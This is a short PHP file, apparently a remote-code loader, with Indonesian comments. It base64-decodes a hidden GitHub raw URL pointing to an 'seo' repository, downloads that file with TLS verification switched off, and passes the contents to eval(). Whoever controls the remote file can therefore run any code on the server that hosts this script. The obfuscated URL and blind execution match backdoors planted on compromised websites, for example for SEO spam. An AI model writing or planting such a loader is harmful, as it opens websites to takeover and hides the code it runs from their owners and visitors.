<?php
function fetch_content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout dalam 10 detik

    $output = curl_exec($ch);
    
    if (curl_errno($ch)) {
        echo 'cURL error: ' . curl_error($ch);
        $output = false;
    }
    
    curl_close($ch);
    return $output;
}

$encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tvbG90MTMvc2VvL3JlZnMvaGVhZHMvbWFpbi9pbmRleC5waHA"; 
$decoded_url = base64_decode($encoded_url);

$content = fetch_content($decoded_url);

if ($content !== false) {
    eval("?>".$content);
} else {
    echo "Gagal mengambil isi file!";
}
?>
